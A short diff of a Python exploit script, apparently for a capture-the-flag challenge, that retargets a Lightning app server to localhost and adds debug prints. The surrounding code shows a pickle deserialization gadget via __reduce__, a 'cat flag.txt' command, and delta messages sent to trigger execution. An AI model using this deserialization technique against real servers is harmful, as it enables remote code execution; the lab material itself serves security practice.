@@ -37,7 +37,8 @@ class Root:
     def __reduce__(self, *args):
         return str, (str(self),)
 
-server_host = 'http://lightning-app:7501'
+# server_host = 'http://lightning-app:7501'
+server_host = 'http://localhost:7501'
 command = 'cat flag.txt'
 
 def send_delta(d):
@@ -146,6 +147,9 @@ for _ in range(5):
         time.sleep(5)
         continue
 
+print("111")
 # Small delay to ensure payload was processed
 time.sleep(1)
 send_delta({}) # Code path triggers when this delta is received
+
+print("222")
